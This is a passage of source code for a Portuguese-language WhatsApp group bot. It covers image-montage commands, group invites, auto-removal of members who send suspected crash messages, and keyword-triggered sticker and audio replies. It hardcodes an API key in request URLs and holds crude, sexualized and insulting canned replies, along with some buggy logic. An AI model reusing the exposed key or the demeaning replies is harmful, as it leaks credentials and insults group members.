fs.unlinkSync(buff)
}
break

case 'legenda':
try {
txt1 = q.split('/')[0]
txt2 = q.split('/')[1]
if(!q.includes("/")) return reply(`Cade a / mano?\nExemplo: ${prefix + command} Sad/Demais`)  
if ((isMedia && !info.message.videoMessage || isQuotedImage)) {
boij = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.imageMessage
owgi = await getFileBuffer(boij, 'image')
res = await upload(owgi)
conn.sendMessage(from, {image: {url: `http://apis.bronxyshost.com/api-bronxys/legenda?url=${res}&texto1=${txt1}&texto2=${txt2}&apikey=@Luix1397`}}, {quoted: info})
} else {
reply('Marque uma imagem...!')
}
} catch (e) {
if(String(e).includes(Luix1397)) {
console.log("A api caiu ou não foi possivel executar esta ação., espere retornar")   
} else {
reply('ERROR!!')
}
}
break

case 'lixo': case 'lgbt': case 'morto': case 'preso': case 'deletem':
case 'procurado': case 'hitler': case 'borrar': case 'merda':
try {
IMG = JSON.parse(JSON.stringify(info)?.replace('quotedM','m'))?.message?.extendedTextMessage?.contextInfo?.message?.imageMessage || info.message?.imageMessage
PXR = await getFileBuffer(IMG, "image")
reply(enviar.espere)
link = await upload(PXR)
conn.sendMessage(from, {image: {url:`http://apis.bronxyshost.com/api-bronxys/montagem?url=${link}&category=${command}&apikey=@Luix1397`}}, {quoted: info}).catch(e => {
return reply("Erro..")
})
} catch (e) {
return reply('Marque uma imagem no WhatsApp, formato jpeg/jpg');
}
break
case 'more':
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
if (!q.includes('|')) return reply("exemplo: Luix|Bot")
const text1 = q.substring(0, q.indexOf('|') - 0)
const text2 = q.substring(q.lastIndexOf('|') + 1)
reply(text1 + readmore + text2)
break

case 'convite':
if(!budy.includes("chat.whatsapp.com")) return reply("Cadê o link do que você deseja que eu entre?")  
cnvt = args.join(" ")
reply(`O convite para o bot entrar em seu grupo, foi enviado, espere o dono aceitar..`)
sendBtext(`${setting.numerodono}@s.whatsapp.net`,`✔️ Convite para entrar em um Grupo\n\nLink : ${cnvt}\n\nNúmero dele(a) : wa.me/${sender.split("@")[0]}`, `☂️`, [
{buttonId: `${prefix}entrar ${cnvt}`, buttonText: {displayText: `Aceitar`}, type: 1},
{buttonId: `${prefix}recusar ${sender}`, buttonText: {displayText: `Recusar`}, type: 1}], selo)
break

case 'recusar':
if(!SoDono) return reply("Só dono...")
conn.sendMessage(q, {text: `Olá Amigo(a), sinto muito dizer, mas seu convite foi recusado 🥺`})
break
case 'nao':
reply(`Olá Amigo(a), Akinator Cancelado✓`)
break
case 'join': case 'entrar':
if (!SoDono) return reply('Somente proprietário!')
string = args.join(' ')
if (!string) return reply('Insira um link de convite ao lado do comando.')
if (string.includes('chat.whatsapp.com/') || reply('Ops, verifique o link que você inseriu.') ) {
link = string.split('app.com/')[1]
try {
await conn.groupAcceptInvite(`${link}`)
} catch(erro) {
if (String(erro).includes('resource-limit') ) {
reply('O grupo já está com o alcance de 257 membros.')
}
if (String(erro).includes('not-authorized') ) {
reply('Não foi possível entrar no grupo.\nMotivo: Banimento.')
}
}
}
conn.sendMessage(q, {text: `Olá Amigo(a), sinto muito dizer, mas...... seu convite foi aceitooo ❤️🔥`})
break
//=======(FIM-EFEITOS-MARCAR)=========\\

default:

//===(CRÉDITOS : ALEATORY CONTEÚDOS)==\\

if(isBotGroupAdmins && isAntiCtt && type === 'contactMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Contato detectado, você é adm, então não irei ti remover'}, {quoted: info})
await sleep(2000);
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
}

if(isBotGroupAdmins && isAntiCtt && type === 'contactsArrayMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Contato detectado, você é adm, então não irei ti remover'}, {quoted: info})
await conn.sendMessage(from, {text: 'opa fechado pelo bot detectado trava contatos'}, {quoted: selo})
await conn.groupSettingUpdate(from, 'announcement')
await sleep(2000);
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'agora enviarei trava aguarde '}, {quoted:selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await conn.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:selo})
}

if(isBotGroupAdmins && Antiloc && type === 'locationMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Localização detectada, você é adm, então não irei ti remover'}, {quoted: info})
await conn.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Localização ou localização comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await conn.groupSettingUpdate(from, 'announcement')
await sleep(2000);
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'agora enviarei trava aguarde '}, {quoted:selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await conn.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:selo})
}

if(isBotGroupAdmins && isAnticatalogo && type === 'productMessage') {
if(isGroupAdmins) return conn.sendMessage(from, {text: 'Catalogo detectado, você é adm, então não irei ti remover'}, {quoted: info})
await conn.sendMessage(from, {text: 'opa fechado pelo bot, detectado trava Catalogo ou Catalogo comum, caso for um engano, fale com algum adm.'}, {quoted: selo})
await conn.groupSettingUpdate(from, 'announcement')
await sleep(2000);
if(!JSON.stringify(groupMembers).includes(sender)) return
conn.groupParticipantsUpdate(from, [sender], 'remove')
await sleep(2000);
await conn.sendMessage(from, { text: 'o grupo sera limpado para evitar fazer efeito da trava'}, {quoted:selo})
await sleep(3000);
clear = `🗑️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n🗑️\n❲❗❳ *Lɪᴍᴘᴇᴢᴀ ᴅᴇ Cʜᴀᴛ Cᴏɴᴄʟᴜɪ́ᴅᴀ* ✅`
conn.sendMessage(from, {text: clear}, {quoted: selo, contextInfo : { forwardingScore: 500, isForwarded:true}})
await sleep(3000);
await conn.sendMessage(from, { text: 'agora enviarei trava aguarde '}, {quoted:selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, {text: destrava(prefix)}, {quoted: selo})
await sleep(2000);
await conn.sendMessage(from, { text: 'reporte ao adm o ocorrido '}, {quoted:selo})
await sleep(5000);
await conn.groupSettingUpdate(from, 'not_announcement')
await sleep(2000);
await conn.sendMessage(from, { text: 'Aberto nao marque a trava ou levara ban✅'}, {quoted:selo})
}

if (isAntiFlood && budy.length >= limitefl && !SoDono && !isPremium && !isnit && isBotGroupAdmins && !isGroupAdmins && !isBot) { 
setTimeout( () => {
return reply('Muitas Caracteres enviadas, isto é contra as normas do grupo, por precaução, eu irei remover.')
console.log(color('Deram Spam de caracteres..','red'))
}, 100)
setTimeout(async () => {
if(!JSON.stringify(groupMembers).includes(sender)) return  
conn.groupParticipantsUpdate(from, [sender], 'remove')
}, 1000)
}

//INICIO DE COMANDOS SEM PREFIXO
switch(testat){
}
if (budy.match("bani")){
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/ban2.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
if(!isGroupAdmins && !SoDono) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
try {
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja remover ele ou marque com ${prefix}ban @marcar-ele`)
if(!JSON.stringify(groupMembers).includes(menc_prt)) return reply("Este usuário já foi removido do grupo.")
if(botNumber.includes(menc_prt)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_prt)) return reply('Não posso remover meu dono 🤧')
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "remove")  
} else {
if(q.length > 15) return reply('Só pode remover uma pessoa por vez..')
if(botNumber.includes(menc_jid)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_jid)) return reply('Não posso remover meu dono 🤧')
if(!JSON.stringify(groupMembers).includes(menc_jid)) return reply("Este usuário já foi removido do grupo.")
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) - `, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "remove")
}
} catch (e) {
console.log(e)
}
}
if (budy.match("Pode banir")){
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/ban2.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
if(!isGroupAdmins && !SoDono) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
try {
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja remover ele ou marque com ${prefix}ban @marcar-ele`)
if(!JSON.stringify(groupMembers).includes(menc_prt)) return reply("Este usuário já foi removido do grupo.")
if(botNumber.includes(menc_prt)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_prt)) return reply('Não posso remover meu dono 🤧')
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "remove")  
} else {
if(q.length > 15) return reply('Só pode remover uma pessoa por vez..')
if(botNumber.includes(menc_jid)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_jid)) return reply('Não posso remover meu dono 🤧')
if(!JSON.stringify(groupMembers).includes(menc_jid)) return reply("Este usuário já foi removido do grupo.")
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) - `, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "remove")
}
} catch (e) {
console.log(e)
}
}
if (budy.match("Pode banir bot")){
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/ban2.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
if(!isGroupAdmins && !SoDono) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
try {
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja remover ele ou marque com ${prefix}ban @marcar-ele`)
if(!JSON.stringify(groupMembers).includes(menc_prt)) return reply("Este usuário já foi removido do grupo.")
if(botNumber.includes(menc_prt)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_prt)) return reply('Não posso remover meu dono 🤧')
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) -`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "remove")  
} else {
if(q.length > 15) return reply('Só pode remover uma pessoa por vez..')
if(botNumber.includes(menc_jid)) return reply('Não sou besta de remover eu mesmo né 🙁, mas estou decepcionado com você')
if(numerodono.includes(menc_jid)) return reply('Não posso remover meu dono 🤧')
if(!JSON.stringify(groupMembers).includes(menc_jid)) return reply("Este usuário já foi removido do grupo.")
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi [ REMOVIDO(A) COM SUCESSO ] - (Por motivos justos.) - `, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "remove")
}
} catch (e) {
console.log(e)
}
}
if (budy.match("Luix Promover")){
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja promover ele pra administrador ou marque com ${prefix}promover @marcar-ele`)
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]} Foi promovido(a) para adm com sucesso.`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "promote")
} else {
if(q.length > 15) return reply('Só pode promover uma pessoa por vez..')
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi promovido(a) para [ ADMINISTRADOR ] com sucesso.`, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "promote")
}}
if (budy.match("Luix rebaixar")){
reply('@${menc_prt.split("@")[0]}  Foi Rebaixado para [ MEMBRO COMUM ] com sucesso.')
if(!isGroupAdmins) return reply('Só ADM pode utilizar este comando.')
if(!isBotGroupAdmins) return reply('O Bot Precisa ser ADM pra executar essa ação.')
if(!budy.includes("@")) {
if (info.message.extendedTextMessage == undefined || info.message.extendedTextMessage == null) return reply(`Marque a mensagem do usuário que deseja promover ele pra administrador ou marque com ${prefix}promover @marcar-ele`)
conn.sendMessage(from, {text: `@${menc_prt.split("@")[0]}  Foi Rebaixado para [ MEMBRO COMUM ] com sucesso.`, mentions: [menc_prt]})
conn.groupParticipantsUpdate(from, [menc_prt], "demote")  
} else {
if(q.length > 15) return reply('Só pode rebaixar uma pessoa por vez..')
conn.sendMessage(from, {text: `@${menc_jid.split("@")[0]} Foi Rebaixado para [ MEMBRO COMUM ] com sucesso.`, mentions: [menc_jid]})
conn.groupParticipantsUpdate(from, [menc_jid], "demote")
}}

if(budy === "bot") {
blars = ["oi delícia", "oi amor da minha vida", "oi princesa do meu coração"] 
blarnd = blars[Math.floor(Math.random() * blars.length)]
reply(blarnd)  
}
if (budy.match(`Luix`) || (budy.match(`Luix bot`))) {
      sendMsg = await conn.sendMessage(from, { react: { text: `💎`, key: info.key }}, {quoted: selo});
            }
if (budy.match(`Boa tarde`) || (budy.match(`bom tarde`))) {
      sendMsg = await conn.sendMessage(from, { react: { text: `🌇`, key: info.key }})
conn.sendMessage(from, {sticker: fs.readFileSync('./armor/boatarde.webp')}, {quoted: selo});
            }
if (budy.match(`Boa noite`) || (budy.match(`boa noite`))) {
      sendMsg = await conn.sendMessage(from, { react: { text: `🌃`, key: info.key }})
conn.sendMessage(from, {sticker: fs.readFileSync('./armor/boanotie.webp')}, {quoted: selo});
            }
if (budy.match(`Bom dia`) || (budy.match(`bom dia`))) {
sendMsg = await conn.sendMessage(from, { react: { text: `🌇`, key: info.key }})
sendMsg = await conn.sendMessage(from, {sticker: fs.readFileSync('./armor/bomdia.webp')}, {quoted: selo});
            }

if(budy.includes("glub glub") || budy.includes("Glub glub") || budy.includes("Glub Glub") || budy.includes("glub glub")) {
if (!isGroup) return
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/glub.webp')}, {quoted: selo});
}

if(budy.includes("te amo") || budy.includes("Te amo") || budy.includes("TE AMO") || budy.includes("te amo")) {
if (!isGroup) return
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/teamo.webp')}, {quoted: selo});
}

if(budy.includes("cachorra") || budy.includes("Cachorra") || budy.includes("CACHORRA") || budy.includes("cachorra")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/vadia.webp')}, {quoted: selo});
}

if(budy.includes("vadia") || budy.includes("Vadia") || budy.includes("VADIA") || budy.includes("vadia")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/vadia2.webp')}, {quoted: selo});}

if(budy.includes("tudo bem") || budy.includes("Tudo bem") || budy.includes("TUDO BEM") || budy.includes("tudo bem")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/bem.webp')}, {quoted: selo});
}

if(budy.includes("bot chato") || budy.includes("Bot chato") || budy.includes(" Sua chata") || budy.includes("Chata") || budy.includes("BOT CHATO") || budy.includes("chata")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/chato.webp')}, {quoted: selo});}

if(budy.includes("puta") || budy.includes("Puta") || budy.includes("PUTA") || budy.includes("fdpt")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/puta.webp')}, {quoted: selo});
}
if(budy.includes("fofa") || budy.includes("Fofa") || budy.includes("FOFA") || budy.includes("fofa")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/fofa.webp')}, {quoted: selo});
await sleep(2000) 
reply("ᬊ᭄𝐀𝐚𝐚𝐡𝐰... 𝐄𝐮 𝐒𝐞𝐢 𝐐𝐮𝐞 𝐒𝐨𝐮 𝐅𝐨𝐟𝐚... 𝐕𝐨𝐜𝐞̂ 𝐓𝐚𝐦𝐛𝐞́𝐦, 𝐌𝐚́𝐬 𝐬𝐨́ 𝐔𝐦 𝐏𝐨𝐮𝐪𝐮𝐢𝐧𝐡𝐨.ᬊ᭄")
}

if(budy.includes("estou bem") || budy.includes("Estou bem") || budy.includes("ESTOU BEM") || budy.includes("tô bem")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/qbom.webp')}, {quoted: selo});
}
if(budy.includes("Clyde") ||  budy.includes("Creide")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/clyde.webp')}, {quoted: selo});
}
if(budy.includes("Charizard") ||  budy.includes("Doritos")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/Guaxizinho.webp')}, {quoted: selo});
}
if(budy.includes("Tomate") ||  budy.includes("Com Sal")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/tomate.webp')}, {quoted: selo});
}
if(budy.includes("Boa Noite Luix") ||  budy.includes("Boa Noite Bot")) {
blabla = fs.readFileSync('./aqua/bonoite.webp')
conn.sendMessage(from, blabla, sticker, {quoted: info})
}

if(budy.includes("Bot Ruim") || budy.includes("bot ruim") || budy.includes("bot lixo") || budy.includes("Bot Lixo")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/teodeio.webp')}, {quoted: selo});
}

if(budy.includes("estou triste") || budy.includes("Estou triste") || budy.includes("ESTOU TRISTE") || budy.includes("eu estou triste")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/triste.webp')}, {quoted: selo});
await sleep(4000) 
conn.updatePresence(from, Presence.composing)
reply("POIS BEM N FIQUE ASSIM,OUVE ESSA MÚSICA PRA TE ALEGRAR")}
if(budy.includes("hentai") || budy.includes("Hentai") || budy.includes("HENTAI") || budy.includes("hentai")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/hentai.webp')}, {quoted: selo});
}

if(budy.includes("gostosa") || budy.includes("Gostosa") || budy.includes("GOSTOSA") || budy.includes("Totosa")){
if (SoDono) {
tujuh = fs.readFileSync('./audios/gostosa.mp3');
conn.sendMessage(from, tujuh, MessageType.audio, {quoted: info, mimetype: 'audio/mp4', ptt:true})
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/gostosamestre.webp')}, {quoted: selo});} else if (!isGroupAdmins) {
conn.updatePresence(from, Presence.composing)
blabla = fs.readFileSync('./logos/gostosa.webp')
conn.sendMessage(from, blabla, sticker, {quoted: info})
} else {
tujuh = fs.readFileSync('./audios/gostosa1.mp3');
conn.sendMessage(from, tujuh, MessageType.audio, {quoted: info, mimetype: 'audio/mp4', ptt:true})
} 
}
if(budy.includes("pix") || budy.includes("Pix") || budy.includes("seu pix") || budy.includes("Seu pix")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./pixgratis.webp')}, {quoted: selo});
await sleep(2000) 
}

if(budy.includes("au au") || budy.includes("Au au") || budy.includes("AU AU") || budy.includes("Auuu")) {
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/auau.webp')}, {quoted: selo});
}

if(budy.includes("vamos namorar") || budy.includes("Vamos namorar") || budy.includes("namorar cmg") || budy.includes("que namorar comigo") ||  budy.includes("Quer namorar cmg") ||
 budy.includes("Namorar cmg")) {
if (SoDono) {
tujuh = await fs.readFileSync("./audios/possibilidade.mp3")
  conn.sendMessage(from, {audio: tujuh, mimetype: 'audio/mp4', ptt:true}, {quoted: info})
}
await sleep(5000) 
reply(`Eu nao Credo vai tomar banho `)
sleep(7000)
conn.sendMessage(from, {sticker: fs.readFileSync('./logos/vadia2.webp')}, {quoted: selo})
}

if(budy.includes("mesmo") || budy.includes("n me diga") || budy.includes("E MESMO") || budy.includes("Não me diga") || budy.includes("E mesmo") || budy.includes("NÃO ME DIGA")) {
tujuh = fs.readFileSync('./audios/mesmo.mp3');
conn.sendMessage(from, tujuh, MessageType.audio, {quoted: info, mimetype: 'audio/mp4', ptt:true})
}

if(budy.includes("Prefixo") || budy.includes("prefixo") || budy.includes("aqua seu prefixo") || budy.includes("Prefixo")) { 
await conn.updatePresence(from, Presence.composing)
reply(`ᬊ᭄𝐌𝐞𝐮 𝐏𝐫𝐞𝐟𝐢𝐱𝐨? 𝐀𝐪𝐮𝐢 𝐄𝐬𝐭𝐚́: ⟪ ${prefix} ⟫`)
}

if (budy.match(`eae`) || (budy.match(`Eae`))) {
      sendMsg = await conn.sendMessage(from, { react: { text: `👋`, key: info.key }})
conn.sendMessage(from, {sticker: fs.readFileSync('./armor/Oi.webp')}, {quoted: selo});
            }
if (budy.match(`Ola`) || (budy.match(`Salve`))) {
      sendMsg = await conn.sendMessage(from, { react: { text: `👋`, key: info.key }})
conn.sendMessage(from, {sticker: fs.readFileSync('./Oi.webp')}, {quoted: selo});
            }
if (budy.match(`Pix`) || (budy.match(`Fazer pix`))) {
      sendMsg = await conn.sendMessage(from, { react: { text: `💠`, key: info.key }})
conn.sendMessage(from, {sticker: fs.readFileSync('./pixgratis.webp')}, {quoted: selo});
            }
if (budy.match(`Oi`) || (budy.match(`Oie`))) {
      sendMsg = await conn.sendMessage(from, { react: { text: `👋`, key: info.key }})
conn.sendMessage(from, {sticker: fs.readFileSync('./Oi.webp')}, {quoted: selo});
            }

if (budy.match("bot corno")){
if(info.key.fromMe) return 
reply("Corno é você, seu animal")
}
if (budy.match("!Menu")){
if(info.key.fromMe) return 
reply(`『⚔️』 Meu Prefixo e ${prefix}`)
}
if (budy.match("Prefixo?")){
if(info.key.fromMe) return 
reply(`『⚔️』 Meu Prefixo e ${prefix}`)
}
if (budy2.includes("adivinha meu celular") || budy2.includes("bot qual meu celular")){
adivinha = info.key.id.length > 21 ? 'Android 🤣' : info.key.id.substring(0, 2) == '3A' ? 'IOS😂😂😅' : 'WhatsApp web';
await conn.sendMessage(from, {text: adivinha}, {quoted: selo})
}

if (budy.match(`Bot enviar menu`)) {
conn.sendMessage(from, { react: { text: `☕`, key: info.key }})
if(menu_audio === true) {
audiomenu = await fs.readFileSync("./audios/menucmd.mp3")
conn.sendMessage(from, {audio: audiomenu, mimetype: 'audio/mp4', ptt:true}, {quoted: selo})
}
img = fs.readFileSync('./luixft.jpg')  

conn.sendMessage(from,{image:img,caption: `
┌───────────────⊰
└┐❀֟፝֟͜͜͡͡͡👑✰͜͢͡️𝐈𝐍𝐅͢𝐎 𝐃͢𝐎𝐍͢𝐎️👑֟፝֟͜͜͡❀
┌┥⋟ 𝑵𝑶𝑴𝑬 𝑩𝑶𝑻: ${NomeDoBot}
││⋟ 𝑵𝑶𝑴𝑬 𝑫𝑶 𝑫𝑶𝑵𝑶 𝑩𝑶𝑻: ${NickDono}
││⋟ 𝑺𝑻𝑨𝑻𝑼𝑺:『 On-line 』
│└────────⊰
╠═══❖•ೋ°ৡ︎•+¹⁸👻+¹⁸•❖•ೋ°ৡ═══╗*
       『👻』❀֟፝֟͜͜͡͡͡𝄞⃟𝐌 𝐄 𝐍 𝐔❀֟፝֟͜͜͡͡͡𝄞⃟ 『👻』   
╠═══❖•ೋ°ৡ︎•+¹⁸👻+¹⁸•❖•ೋ°ৡ═══╝
║
╠┄┄┄⟨👻𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐂̧𝐎̃𝐄𝐒👻⟩
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Menulogos
║ঔৣ͜͡ீ͜❤️‍🩹${prefix}Brincadeiras
